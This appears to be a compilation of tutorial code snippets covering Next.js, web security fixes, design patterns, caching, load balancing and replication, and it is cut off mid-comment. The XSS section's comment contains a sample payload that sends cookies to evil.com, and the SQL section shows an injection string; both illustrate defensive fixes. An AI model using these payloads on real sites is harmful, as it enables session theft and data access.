Example 1: App Router with Server and Client Components // app/dashboard/page.tsx — Server Component (default)
// This component runs ONLY on the server. It can directly access databases,
// read files, and call internal services without exposing secrets to the client.

import { getServerSession } from 'next-auth';
import { prisma } from '@/lib/prisma';
import { DashboardChart } from './DashboardChart';

export default async function DashboardPage() {
  const session = await getServerSession();

  if (!session) {
    redirect('/login');
  }

  // Direct database access — no API route needed
  const metrics = await prisma.metric.findMany({
    where: { userId: session.user.id },
    orderBy: { createdAt: 'desc' },
    take: 30,
  });

  // Server Component passes serializable data to Client Component
  return (
    <main>
      <h1>Dashboard</h1>
      <DashboardChart data={metrics} />
    </main>
  );
} // app/dashboard/DashboardChart.tsx — Client Component
// The 'use client' directive marks this as a Client Component.
// It ships JavaScript to the browser and can use hooks, event handlers, and browser APIs.

'use client';

import { useState } from 'react';
import { LineChart, Line, XAxis, YAxis, Tooltip } from 'recharts';

interface Metric {
  id: string;
  value: number;
  createdAt: string;
}

export function DashboardChart({ data }: { data: Metric[] }) {
  const [timeRange, setTimeRange] = useState<'7d' | '30d'>('7d');

  const filtered = timeRange === '7d' ? data.slice(0, 7) : data;

  return (
    <div>
      <button onClick={() => setTimeRange('7d')}>7 Days</button>
      <button onClick={() => setTimeRange('30d')}>30 Days</button>
      <LineChart width={600} height={300} data={filtered}>
        <XAxis dataKey="createdAt" />
        <YAxis />
        <Tooltip />
        <Line type="monotone" dataKey="value" stroke="#8884d8" />
      </LineChart>
    </div>
  );
} The Server Component fetches data directly from the database without an intermediate API layer, reducing latency and eliminating client-side loading states for the initial render. The Client Component receives pre-fetched data as props and handles interactive state locally.

Example 2: Server Actions for Form Handling // app/posts/new/page.tsx — Server Action defined inline
import { revalidatePath } from 'next/cache';
import { redirect } from 'next/navigation';
import { prisma } from '@/lib/prisma';
import { z } from 'zod';

const PostSchema = z.object({
  title: z.string().min(1).max(200),
  content: z.string().min(10).max(50000),
  published: z.coerce.boolean().default(false),
});

export default function NewPostPage() {
  async function createPost(formData: FormData) {
    'use server';

    const parsed = PostSchema.safeParse({
      title: formData.get('title'),
      content: formData.get('content'),
      published: formData.get('published'),
    });

    if (!parsed.success) {
      throw new Error('Validation failed: ' + parsed.error.message);
    }

    await prisma.post.create({
      data: parsed.data,
    });

    revalidatePath('/posts');
    redirect('/posts');
  }

  return (
    <form action={createPost}>
      <input name="title" placeholder="Post title" required />
      <textarea name="content" placeholder="Write your post..." required />
      <label>
        <input type="checkbox" name="published" />
        Publish immediately
      </label>
      <button type="submit">Create Post</button>
    </form>
  );
} Server Actions eliminate the need for separate API routes for form submissions. The function marked with 'use server' executes entirely on the server, with Next.js automatically handling the network request, serialization, and error propagation. This pattern reduces boilerplate while maintaining type safety between client and server.

Example 3: Middleware for Authentication and Routing // middleware.ts — Runs at the edge before every matched request
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';
import { getToken } from 'next-auth/jwt';

export async function middleware(request: NextRequest) {
  const token = await getToken({ req: request });
  const { pathname } = request.nextUrl;

  // Allow public routes
  if (pathname.startsWith('/login') || pathname.startsWith('/api/auth')) {
    return NextResponse.next();
  }

  // Redirect unauthenticated users to login
  if (!token) {
    const loginUrl = new URL('/login', request.url);
    loginUrl.searchParams.set('callbackUrl', pathname);
    return NextResponse.redirect(loginUrl);
  }

  // Role-based access control
  if (pathname.startsWith('/admin') && token.role !== 'admin') {
    return NextResponse.redirect(new URL('/unauthorized', request.url));
  }

  return NextResponse.next();
}

export const config = {
  matcher: ['/((?!_next/static|_next/image|favicon.ico).*)'],
}; Middleware executes at the edge (CDN level) before the request reaches your application server. This makes authentication checks extremely fast and prevents unauthorized requests from consuming server resources. The matcher configuration excludes static assets from middleware processing.

Example 1: Preventing SQL Injection with Parameterized Queries // VULNERABLE: String concatenation allows SQL injection
public User findUser(String username) {
    String query = "SELECT * FROM users WHERE username = '" + username + "'";
    // Attacker input: ' OR '1'='1' --
    // Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1' --'
    return jdbcTemplate.queryForObject(query, new UserRowMapper());
}

// SECURE: Parameterized query prevents injection
public User findUserSecure(String username) {
    String query = "SELECT * FROM users WHERE username = ?";
    return jdbcTemplate.queryForObject(query, new UserRowMapper(), username);
}

// SECURE: Using JPA/Hibernate named parameters
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username); The parameterized approach treats user input as data rather than executable SQL. The database driver handles escaping, making it impossible for an attacker to break out of the parameter context regardless of what characters they submit.

Example 2: XSS Prevention with Output Encoding // VULNERABLE: Directly inserting user content into DOM
function renderComment(comment: string): string {
  return `<div class="comment">${comment}</div>`;
  // Attacker input: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
}

// SECURE: HTML entity encoding before rendering
function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function renderCommentSecure(comment: string): string {
  return `<div class="comment">${escapeHtml(comment)}</div>`;
}

// SECURE: React automatically escapes by default
function Comment({ text }: { text: string }) {
  return <div className="comment">{text}</div>; // Safe: React escapes
  // DANGEROUS: <div dangerouslySetInnerHTML={{ __html: text }} /> // Bypasses escaping
} React's JSX automatically escapes interpolated values, which is why dangerouslySetInnerHTML exists as an explicit opt-out. Any use of dangerouslySetInnerHTML should trigger immediate security review.

Example 3: CSRF Protection with Token Validation // Spring Security CSRF configuration
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler())
            )
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            );
        return http.build();
    }
} // Frontend: Including CSRF token in requests
async function submitForm(data: FormData): Promise<Response> {
  const csrfToken = document.querySelector('meta[name="csrf-token"]')
    ?.getAttribute('content');

  return fetch('/api/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken ?? '',
    },
    credentials: 'same-origin',
    body: JSON.stringify(data),
  });
} CSRF tokens work because an attacker on a different origin cannot read the token value. The server generates a unique token per session, embeds it in the page, and validates it on every state-changing request. Without the token, forged cross-origin requests are rejected.

Behavioral Patterns Behavioral patterns are concerned with algorithms and the assignment of responsibilities between objects. The Strategy pattern defines a family of algorithms, encapsulates each one, and makes them interchangeable. The Observer pattern defines a one-to-many dependency between objects so that when one object changes state, all its dependents are notified automatically. Spring's event system (ApplicationEventPublisher and @EventListener) is a direct implementation of Observer. The Template Method pattern defines the skeleton of an algorithm in a superclass, letting subclasses override specific steps without changing the algorithm's structure. Spring's JdbcTemplate, RestTemplate, and TransactionTemplate all follow this pattern. The Command pattern encapsulates a request as an object, letting you parameterize clients with different requests, queue or log requests, and support undoable operations. Chain of Responsibility passes a request along a chain of handlers, where each handler decides either to process the request or pass it to the next handler. Spring Security's filter chain is a production example of this pattern. The State pattern allows an object to alter its behavior when its internal state changes, appearing to change its class. // Strategy Pattern with Spring dependency injection
public interface PaymentStrategy {
    PaymentResult process(PaymentRequest request);
}

@Component("creditCard")
public class CreditCardPayment implements PaymentStrategy {
    @Override
    public PaymentResult process(PaymentRequest request) {
        // Credit card processing logic
        return new PaymentResult(Status.SUCCESS, "CC-" + UUID.randomUUID());
    }
}

@Component("bankTransfer")
public class BankTransferPayment implements PaymentStrategy {
    @Override
    public PaymentResult process(PaymentRequest request) {
        // Bank transfer processing logic
        return new PaymentResult(Status.PENDING, "BT-" + UUID.randomUUID());
    }
}

@Service
public class PaymentService {
    private final Map<String, PaymentStrategy> strategies;

    // Spring injects all PaymentStrategy beans into this map keyed by bean name
    public PaymentService(Map<String, PaymentStrategy> strategies) {
        this.strategies = strategies;
    }

    public PaymentResult processPayment(String method, PaymentRequest request) {
        PaymentStrategy strategy = strategies.get(method);
        if (strategy == null) {
            throw new UnsupportedPaymentMethodException(method);
        }
        return strategy.process(request);
    }
} // Builder Pattern for complex object construction
@Builder
@Getter
public class OrderRequest {
    private final String customerId;
    private final List<OrderItem> items;
    private final ShippingAddress shippingAddress;
    private final PaymentMethod paymentMethod;
    @Builder.Default
    private final OrderPriority priority = OrderPriority.STANDARD;
    @Builder.Default
    private final boolean giftWrapping = false;
    private final String specialInstructions;

    // Lombok @Builder generates the builder class, but here is the manual equivalent:
    public static class OrderRequestBuilder {
        public OrderRequestBuilder addItem(String productId, int quantity, BigDecimal price) {
            if (this.items == null) this.items = new ArrayList<>();
            this.items.add(new OrderItem(productId, quantity, price));
            return this;
        }
    }
}

// Usage
OrderRequest order = OrderRequest.builder()
    .customerId("CUST-12345")
    .addItem("PROD-001", 2, new BigDecimal("29.99"))
    .addItem("PROD-002", 1, new BigDecimal("49.99"))
    .shippingAddress(ShippingAddress.builder()
        .street("123 Main St")
        .city("Seattle")
        .state("WA")
        .zipCode("98101")
        .build())
    .paymentMethod(PaymentMethod.CREDIT_CARD)
    .priority(OrderPriority.EXPRESS)
    .giftWrapping(true)
    .specialInstructions("Leave at front door")
    .build();

Message Transformation Message translators convert messages from one format to another, enabling communication between systems with different data representations. Content enrichers augment messages with additional data from external sources (databases, APIs, caches) before forwarding them to the next processing step. Content filters remove unnecessary data from messages, reducing payload size and protecting sensitive information from reaching unauthorized consumers. The claim check pattern stores large message payloads in external storage and replaces them with a reference token, reducing memory pressure on the messaging infrastructure. The normalizer pattern handles messages arriving in different formats by routing each format through the appropriate translator to produce a canonical form for downstream processing. // Spring Integration message routing example
@Configuration
@EnableIntegration
public class OrderIntegrationConfig {

    @Bean
    public IntegrationFlow orderProcessingFlow() {
        return IntegrationFlow.from("orderInputChannel")
            .enrichHeaders(h -> h.header("timestamp", Instant.now()))
            .<OrderEvent, String>route(
                OrderEvent::getType,
                mapping -> mapping
                    .subFlowMapping("CREATED", sf -> sf
                        .handle(orderValidationService(), "validate")
                        .handle(inventoryService(), "reserve"))
                    .subFlowMapping("CANCELLED", sf -> sf
                        .handle(inventoryService(), "release")
                        .handle(refundService(), "processRefund"))
                    .subFlowMapping("SHIPPED", sf -> sf
                        .handle(notificationService(), "sendShipmentNotification"))
            )
            .handle(auditService(), "logEvent")
            .get();
    }

    @Bean
    public IntegrationFlow deadLetterFlow() {
        return IntegrationFlow.from("errorChannel")
            .handle(message -> {
                log.error("Failed to process message: {}", message.getPayload());
                deadLetterRepository.save(new DeadLetter(message));
            })
            .get();
    }
}

Event Sourcing and CQRS Event Sourcing persists the state of a business entity as a sequence of state-changing events rather than storing only the current state. Every change is captured as an immutable event appended to an event store. The current state is reconstructed by replaying events from the beginning or from a snapshot. This provides a complete audit trail, enables temporal queries (what was the state at time T?), and supports event-driven architectures naturally. Command Query Responsibility Segregation (CQRS) separates the write model (commands that change state) from the read model (queries that return data). The write side processes commands and emits events, while the read side maintains denormalized projections optimized for specific query patterns. Combined with Event Sourcing, CQRS enables building multiple read models from the same event stream, each tailored to different query requirements without impacting write performance. // Saga Orchestrator with Spring State Machine
@Configuration
public class OrderSagaConfig {

    @Bean
    public StateMachine<OrderSagaState, OrderSagaEvent> orderSagaStateMachine(
            StateMachineFactory<OrderSagaState, OrderSagaEvent> factory) {
        return factory.getStateMachine("orderSaga");
    }

    @Bean
    public StateMachineConfigurer<OrderSagaState, OrderSagaEvent> sagaConfigurer() {
        return new StateMachineConfigurerAdapter<>() {
            @Override
            public void configure(StateMachineTransitionConfigurer<OrderSagaState, OrderSagaEvent> transitions)
                    throws Exception {
                transitions
                    .withExternal()
                        .source(OrderSagaState.INITIATED)
                        .target(OrderSagaState.INVENTORY_RESERVED)
                        .event(OrderSagaEvent.RESERVE_INVENTORY)
                        .action(reserveInventoryAction())
                    .and()
                    .withExternal()
                        .source(OrderSagaState.INVENTORY_RESERVED)
                        .target(OrderSagaState.PAYMENT_PROCESSED)
                        .event(OrderSagaEvent.PROCESS_PAYMENT)
                        .action(processPaymentAction())
                    .and()
                    .withExternal()
                        .source(OrderSagaState.PAYMENT_PROCESSED)
                        .target(OrderSagaState.ORDER_CONFIRMED)
                        .event(OrderSagaEvent.CONFIRM_ORDER)
                        .action(confirmOrderAction())
                    .and()
                    // Compensation transitions
                    .withExternal()
                        .source(OrderSagaState.INVENTORY_RESERVED)
                        .target(OrderSagaState.COMPENSATING)
                        .event(OrderSagaEvent.PAYMENT_FAILED)
                        .action(releaseInventoryAction())
                    .and()
                    .withExternal()
                        .source(OrderSagaState.COMPENSATING)
                        .target(OrderSagaState.CANCELLED)
                        .event(OrderSagaEvent.COMPENSATION_COMPLETE);
            }
        };
    }
}

// Saga step action
@Component
public class ReserveInventoryAction implements Action<OrderSagaState, OrderSagaEvent> {
    private final InventoryServiceClient inventoryClient;

    @Override
    public void execute(StateContext<OrderSagaState, OrderSagaEvent> context) {
        OrderSagaData data = (OrderSagaData) context.getExtendedState()
            .getVariables().get("sagaData");
        try {
            InventoryReservation reservation = inventoryClient.reserve(data.getItems());
            data.setReservationId(reservation.getId());
            context.getStateMachine().sendEvent(OrderSagaEvent.PROCESS_PAYMENT);
        } catch (InsufficientStockException e) {
            data.setFailureReason("Insufficient stock: " + e.getMessage());
            context.getStateMachine().sendEvent(OrderSagaEvent.PAYMENT_FAILED);
        }
    }
}

Load Balancing Algorithms Load balancing distributes incoming network traffic across multiple backend servers to improve availability, throughput, and response times. Effective load balancing prevents any single server from becoming a bottleneck while enabling horizontal scaling, rolling deployments, and graceful degradation during failures. The choice of algorithm significantly impacts request distribution fairness, session affinity, and cache efficiency. Round Robin is the simplest algorithm, distributing requests sequentially across servers in a circular pattern. It works well when servers have identical capacity and requests have uniform processing cost. Weighted Round Robin extends this by assigning weights proportional to server capacity — a server with weight 3 receives three times as many requests as one with weight 1. This handles heterogeneous server fleets but still assumes uniform request cost. Least Connections routes each new request to the server with the fewest active connections, naturally adapting to varying request processing times. Servers handling slow requests accumulate connections and receive fewer new ones, while servers completing requests quickly get more traffic. Weighted Least Connections combines connection counting with capacity weights for heterogeneous environments. This algorithm excels for long-lived connections (WebSockets, database connections) where connection count correlates with load. IP Hash computes a hash of the client IP address to deterministically route all requests from the same client to the same server. This provides session affinity without cookies or application-layer state, useful for applications with server-local session storage. However, IP Hash distributes poorly when traffic comes through proxies or NAT (many clients sharing one IP) and causes imbalanced distribution when servers are added or removed (all hash mappings shift). Consistent Hashing solves the redistribution problem by mapping both servers and requests onto a hash ring. When a server is added or removed, only requests that mapped to the affected segment are redistributed — approximately 1/N of total requests rather than all of them. Virtual nodes (multiple hash positions per physical server) improve distribution uniformity. Consistent hashing is the foundation for distributed caches (Memcached, Redis Cluster), CDN routing, and database sharding. // Consistent hashing implementation for load balancing
import java.util.SortedMap;
import java.util.TreeMap;
import java.security.MessageDigest;
import java.nio.charset.StandardCharsets;

public class ConsistentHashLoadBalancer {
    private final SortedMap<Long, String> ring = new TreeMap<>();
    private final int virtualNodes;

    public ConsistentHashLoadBalancer(int virtualNodes) {
        this.virtualNodes = virtualNodes;
    }

    public void addServer(String server) {
        for (int i = 0; i < virtualNodes; i++) {
            long hash = hash(server + "#" + i);
            ring.put(hash, server);
        }
    }

    public void removeServer(String server) {
        for (int i = 0; i < virtualNodes; i++) {
            long hash = hash(server + "#" + i);
            ring.remove(hash);
        }
    }

    public String getServer(String key) {
        if (ring.isEmpty()) return null;
        long hash = hash(key);
        // Find the first server clockwise from the hash position
        SortedMap<Long, String> tailMap = ring.tailMap(hash);
        Long targetHash = tailMap.isEmpty() ? ring.firstKey() : tailMap.firstKey();
        return ring.get(targetHash);
    }

    private long hash(String key) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] digest = md.digest(key.getBytes(StandardCharsets.UTF_8));
            return ((long)(digest[0] & 0xFF) << 24) |
                   ((long)(digest[1] & 0xFF) << 16) |
                   ((long)(digest[2] & 0xFF) << 8) |
                   (digest[3] & 0xFF);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}

Thread-Safe Producer-Consumer Queue with Condition Variables import java.util.LinkedList;
import java.util.Queue;
import java.util.concurrent.locks.Condition;
import java.util.concurrent.locks.ReentrantLock;

public class BoundedBlockingQueue<T> {
    private final Queue<T> queue;
    private final int capacity;
    private final ReentrantLock lock;
    private final Condition notFull;
    private final Condition notEmpty;

    public BoundedBlockingQueue(int capacity) {
        this.capacity = capacity;
        this.queue = new LinkedList<>();
        this.lock = new ReentrantLock();
        this.notFull = lock.newCondition();
        this.notEmpty = lock.newCondition();
    }

    public void put(T item) throws InterruptedException {
        lock.lock();
        try {
            // Wait while queue is full (loop handles spurious wakeups)
            while (queue.size() == capacity) {
                notFull.await();
            }
            queue.offer(item);
            notEmpty.signal(); // Wake one waiting consumer
        } finally {
            lock.unlock();
        }
    }

    public T take() throws InterruptedException {
        lock.lock();
        try {
            // Wait while queue is empty
            while (queue.isEmpty()) {
                notEmpty.await();
            }
            T item = queue.poll();
            notFull.signal(); // Wake one waiting producer
            return item;
        } finally {
            lock.unlock();
        }
    }

    public int size() {
        lock.lock();
        try {
            return queue.size();
        } finally {
            lock.unlock();
        }
    }
}

Virtual Memory Page Table Lookup #include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define PAGE_SIZE 4096
#define PAGE_OFFSET_BITS 12
#define PTE_PRESENT  (1UL << 0)
#define PTE_WRITABLE (1UL << 1)
#define PTE_USER     (1UL << 2)
#define PTE_ACCESSED (1UL << 5)
#define PTE_DIRTY    (1UL << 6)

typedef struct {
    uint64_t entries[512];  // 512 entries per page table level
} PageTable;

typedef struct {
    PageTable *pgd;  // Page Global Directory (top level)
    uint64_t total_pages_allocated;
    uint64_t page_faults;
} AddressSpace;

/* Extract page table indices from a virtual address (4-level paging) */
static inline uint64_t pgd_index(uint64_t vaddr) { return (vaddr >> 39) & 0x1FF; }
static inline uint64_t pud_index(uint64_t vaddr) { return (vaddr >> 30) & 0x1FF; }
static inline uint64_t pmd_index(uint64_t vaddr) { return (vaddr >> 21) & 0x1FF; }
static inline uint64_t pte_index(uint64_t vaddr) { return (vaddr >> 12) & 0x1FF; }
static inline uint64_t page_offset(uint64_t vaddr) { return vaddr & 0xFFF; }

/* Simulate a page table walk to translate virtual to physical address */
uint64_t translate_address(AddressSpace *as, uint64_t virtual_addr) {
    uint64_t pgd_entry = as->pgd->entries[pgd_index(virtual_addr)];
    if (!(pgd_entry & PTE_PRESENT)) {
        as->page_faults++;
        printf("Page fault at PGD level for address 0x%lx\n", virtual_addr);
        return 0;  // Would trigger page fault handler in real kernel
    }

    PageTable *pud = (PageTable *)(pgd_entry & ~0xFFF);
    uint64_t pud_entry = pud->entries[pud_index(virtual_addr)];
    if (!(pud_entry & PTE_PRESENT)) {
        as->page_faults++;
        printf("Page fault at PUD level for address 0x%lx\n", virtual_addr);
        return 0;
    }

    PageTable *pmd = (PageTable *)(pud_entry & ~0xFFF);
    uint64_t pmd_entry = pmd->entries[pmd_index(virtual_addr)];
    if (!(pmd_entry & PTE_PRESENT)) {
        as->page_faults++;
        printf("Page fault at PMD level for address 0x%lx\n", virtual_addr);
        return 0;
    }

    PageTable *pte = (PageTable *)(pmd_entry & ~0xFFF);
    uint64_t pte_entry = pte->entries[pte_index(virtual_addr)];
    if (!(pte_entry & PTE_PRESENT)) {
        as->page_faults++;
        printf("Page fault at PTE level for address 0x%lx\n", virtual_addr);
        return 0;
    }

    /* Mark page as accessed */
    pte->entries[pte_index(virtual_addr)] |= PTE_ACCESSED;

    uint64_t physical_frame = pte_entry & ~0xFFF;
    uint64_t physical_addr = physical_frame | page_offset(virtual_addr);
    return physical_addr;
}

Cache-Aside Pattern with Stampede Protection @Service
public class ProductCatalogService {
    private final ProductRepository repository;
    private final RedisTemplate<String, Product> cache;
    private final Map<String, CompletableFuture<Product>> inflightRequests =
        new ConcurrentHashMap<>();
    private static final Duration CACHE_TTL = Duration.ofMinutes(10);
    private static final Duration JITTER_RANGE = Duration.ofMinutes(2);

    public ProductCatalogService(ProductRepository repository,
                                  RedisTemplate<String, Product> cache) {
        this.repository = repository;
        this.cache = cache;
    }

    /**
     * Get product with cache-aside pattern and singleflight protection.
     * Only one thread fetches from DB on cache miss; others wait for the result.
     * This prevents thundering herd on popular keys.
     */
    public Product getProduct(String productId) {
        String cacheKey = "product:" + productId;

        // Check cache first
        Product cached = cache.opsForValue().get(cacheKey);
        if (cached != null) {
            return cached;
        }

        // Singleflight: coalesce concurrent requests for the same key
        CompletableFuture<Product> future = inflightRequests.computeIfAbsent(
            cacheKey,
            key -> CompletableFuture.supplyAsync(() -> {
                try {
                    Product product = repository.findById(productId)
                        .orElseThrow(() -> new ProductNotFoundException(productId));

                    // Store in cache with jittered TTL to prevent synchronized expiration
                    Duration ttl = CACHE_TTL.plus(Duration.ofMillis(
                        ThreadLocalRandom.current().nextLong(JITTER_RANGE.toMillis())
                    ));
                    cache.opsForValue().set(cacheKey, product, ttl);

                    return product;
                } finally {
                    // Remove from inflight map after completion
                    inflightRequests.remove(cacheKey);
                }
            })
        );

        try {
            return future.get(5, TimeUnit.SECONDS);
        } catch (Exception e) {
            inflightRequests.remove(cacheKey);
            throw new CacheException("Failed to load product: " + productId, e);
        }
    }

    /**
     * Invalidate cache on product update.
     * Uses delete rather than update to avoid race conditions between
     * concurrent reads and writes.
     */
    public Product updateProduct(String productId, ProductUpdateRequest request) {
        Product updated = repository.save(applyUpdate(productId, request));
        cache.delete("product:" + productId);

        // Also invalidate any aggregate caches that include this product
        cache.delete("category-products:" + updated.getCategoryId());
        cache.delete("search-results:*"); // Pattern-based invalidation

        return updated;
    }

    /**
     * Probabilistic early expiration: refresh cache before TTL expires
     * to prevent cache misses during high-traffic periods.
     */
    public Product getProductWithEarlyRefresh(String productId) {
        String cacheKey = "product:" + productId;
        CachedValue<Product> entry = getWithMetadata(cacheKey);

        if (entry != null) {
            // Check if we should probabilistically refresh
            double remainingTtlRatio = entry.getRemainingTtlRatio();
            double refreshProbability = Math.exp(-remainingTtlRatio * 10);

            if (ThreadLocalRandom.current().nextDouble() < refreshProbability) {
                // Async refresh: return stale value immediately, update cache in background
                CompletableFuture.runAsync(() -> refreshCache(productId, cacheKey));
            }
            return entry.getValue();
        }

        // Cache miss: synchronous fetch
        return getProduct(productId);
    }
}

Multi-Level Cache with Write-Through interface CacheEntry<T> {
  value: T;
  version: number;
  expiresAt: number;
  source: 'l1' | 'l2' | 'origin';
}

interface CacheConfig {
  l1MaxSize: number;        // Local in-memory cache size
  l1TtlMs: number;         // L1 TTL (short, e.g., 30 seconds)
  l2TtlMs: number;         // L2 TTL (longer, e.g., 5 minutes)
  l2Client: RedisClient;   // Distributed cache client
}

class MultiLevelCache<T> {
  private l1Cache: Map<string, CacheEntry<T>> = new Map();
  private l1AccessOrder: string[] = []; // For LRU eviction
  private config: CacheConfig;
  private stats = { l1Hits: 0, l2Hits: 0, misses: 0, writes: 0 };

  constructor(config: CacheConfig) {
    this.config = config;
  }

  /**
   * Read-through: check L1, then L2, then origin.
   * Populate lower cache levels on miss.
   */
  async get(key: string, fetchFromOrigin: () => Promise<T>): Promise<T> {
    // Level 1: Local in-memory cache (fastest, smallest)
    const l1Entry = this.l1Cache.get(key);
    if (l1Entry && l1Entry.expiresAt > Date.now()) {
      this.stats.l1Hits++;
      this.touchLru(key);
      return l1Entry.value;
    }

    // Level 2: Distributed cache (Redis)
    const l2Value = await this.config.l2Client.get(key);
    if (l2Value) {
      this.stats.l2Hits++;
      const entry: CacheEntry<T> = JSON.parse(l2Value);
      // Promote to L1
      this.setL1(key, entry.value, entry.version);
      return entry.value;
    }

    // Origin: Database or upstream service
    this.stats.misses++;
    const value = await fetchFromOrigin();
    const version = Date.now();

    // Write-through: populate both cache levels
    await this.setL2(key, value, version);
    this.setL1(key, value, version);

    return value;
  }

  /**
   * Write-through: update origin, then invalidate/update caches.
   * Ensures caches never serve data newer than what is in the origin.
   */
  async put(key: string, value: T, writeToOrigin: (v: T) => Promise<void>): Promise<void> {
    this.stats.writes++;
    const version = Date.now();

    // Write to origin first (source of truth)
    await writeToOrigin(value);

    // Update caches with new value
    await this.setL2(key, value, version);
    this.setL1(key, value, version);
  }

  /**
   * Invalidate across all cache levels.
   * Used when the update is complex and re-caching the new value is not straightforward.
   */
  async invalidate(key: string): Promise<void> {
    this.l1Cache.delete(key);
    await this.config.l2Client.del(key);
  }

  private setL1(key: string, value: T, version: number): void {
    // Evict if at capacity (LRU)
    while (this.l1Cache.size >= this.config.l1MaxSize) {
      const evictKey = this.l1AccessOrder.shift();
      if (evictKey) this.l1Cache.delete(evictKey);
    }

    this.l1Cache.set(key, {
      value,
      version,
      expiresAt: Date.now() + this.config.l1TtlMs,
      source: 'l1'
    });
    this.touchLru(key);
  }

  private async setL2(key: string, value: T, version: number): Promise<void> {
    const entry: CacheEntry<T> = {
      value,
      version,
      expiresAt: Date.now() + this.config.l2TtlMs,
      source: 'l2'
    };
    await this.config.l2Client.set(key, JSON.stringify(entry), {
      PX: this.config.l2TtlMs
    });
  }

  private touchLru(key: string): void {
    const index = this.l1AccessOrder.indexOf(key);
    if (index !== -1) this.l1AccessOrder.splice(index, 1);
    this.l1AccessOrder.push(key);
  }

  getStats() {
    const total = this.stats.l1Hits + this.stats.l2Hits + this.stats.misses;
    return {
      ...this.stats,
      l1HitRate: total > 0 ? this.stats.l1Hits / total : 0,
      l2HitRate: total > 0 ? this.stats.l2Hits / total : 0,
      overallHitRate: total > 0 ? (this.stats.l1Hits + this.stats.l2Hits) / total : 0,
      l1Size: this.l1Cache.size,
      l1Capacity: this.config.l1MaxSize
    };
  }
}

CDN Cache Invalidation with Surrogate Keys /**
 * CDN cache management using surrogate keys (cache tags).
 * Surrogate keys allow invalidating groups of cached responses
 * without knowing their exact URLs.
 */
@Service
public class CdnCacheManager {
    private final CdnClient cdnClient; // Fastly, CloudFront, etc.
    private final EventPublisher eventPublisher;

    public CdnCacheManager(CdnClient cdnClient, EventPublisher eventPublisher) {
        this.cdnClient = cdnClient;
        this.eventPublisher = eventPublisher;
    }

    /**
     * Generate cache headers for a product page response.
     * Surrogate keys enable targeted invalidation when product data changes.
     */
    public HttpHeaders generateCacheHeaders(Product product) {
        HttpHeaders headers = new HttpHeaders();

        // Browser cache: short TTL for freshness
        headers.setCacheControl(CacheControl.maxAge(60, TimeUnit.SECONDS)
            .staleWhileRevalidate(300, TimeUnit.SECONDS));

        // CDN cache: longer TTL, rely on invalidation for freshness
        headers.set("Surrogate-Control", "max-age=3600");

        // Surrogate keys for targeted invalidation
        // When product changes: purge all responses tagged with this product
        String surrogateKeys = String.join(" ",
            "product-" + product.getId(),
            "category-" + product.getCategoryId(),
            "brand-" + product.getBrandId(),
            product.isOnSale() ? "sale-items" : "regular-items"
        );
        headers.set("Surrogate-Key", surrogateKeys);

        // Vary header for content negotiation
        headers.set("Vary", "Accept-Encoding, Accept-Language");

        return headers;
    }

    /**
     * Invalidate CDN cache when product is updated.
     * Uses surrogate keys to purge all cached responses containing this product.
     */
    @EventListener
    public void onProductUpdated(ProductUpdatedEvent event) {
        String productKey = "product-" + event.getProductId();

        // Purge all CDN responses tagged with this product's surrogate key
        cdnClient.purgeByKey(productKey)
            .thenAccept(result -> {
                if (result.getPurgedCount() > 0) {
                    log.info("Purged {} CDN objects for product {}",
                        result.getPurgedCount(), event.getProductId());
                }
            })
            .exceptionally(e -> {
                log.error("CDN purge failed for product {}", event.getProductId(), e);
                // Schedule retry with exponential backoff
                scheduleRetry(productKey, 1);
                return null;
            });
    }

    /**
     * Bulk invalidation for category-wide changes (e.g., sale starts).
     */
    public CompletableFuture<PurgeResult> invalidateCategory(String categoryId) {
        return cdnClient.purgeByKey("category-" + categoryId);
    }

    /**
     * Soft purge: mark cached content as stale rather than deleting it.
     * Stale content is served while fresh content is fetched in the background.
     * This prevents origin overload during mass invalidation events.
     */
    public CompletableFuture<PurgeResult> softPurge(String surrogateKey) {
        return cdnClient.softPurgeByKey(surrogateKey);
    }
}

Implementing Quorum-Based Reads and Writes public class QuorumReplicator<T> {
    private final List<ReplicaClient<T>> replicas;
    private final int writeQuorum;  // W
    private final int readQuorum;   // R
    // Invariant: W + R > N (total replicas) ensures overlap

    public QuorumReplicator(List<ReplicaClient<T>> replicas, int writeQuorum, int readQuorum) {
        this.replicas = replicas;
        this.writeQuorum = writeQuorum;
        this.readQuorum = readQuorum;

        int n = replicas.size();
        if (writeQuorum + readQuorum <= n) {
            throw new IllegalArgumentException(
                "W + R must be > N for consistency. W=" + writeQuorum +
                ", R=" + readQuorum + ", N=" + n
            );
        }
    }

    /**
     * Write to W replicas. Returns success only when W acknowledgments received.
     * Each write carries a version (timestamp or logical clock) for conflict resolution.
     */
    public WriteResult write(String key, T value) {
        long version = System.nanoTime(); // In production, use hybrid logical clock
        VersionedValue<T> versioned = new VersionedValue<>(value, version);

        List<CompletableFuture<Boolean>> futures = replicas.stream()
            .map(replica -> CompletableFuture.supplyAsync(() ->
                replica.write(key, versioned)))
            .collect(Collectors.toList());

        // Wait for W successful acknowledgments
        int acks = 0;
        int failures = 0;
        for (CompletableFuture<Boolean> future : futures) {
            try {
                if (future.get(5, TimeUnit.SECONDS)) {
                    acks++;
                    if (acks >= writeQuorum) {
                        return WriteResult.success(version);
                    }
                } else {
                    failures++;
                }
            } catch (Exception e) {
                failures++;
            }
            // Early termination: if we can't reach quorum even with remaining futures
            if (failures > replicas.size() - writeQuorum) {
                return WriteResult.failure("Cannot reach write quorum");
            }
        }
        return WriteResult.failure("Insufficient acknowledgments: " + acks);
    }

    /**
     * Read from R replicas and return the value with the highest version.
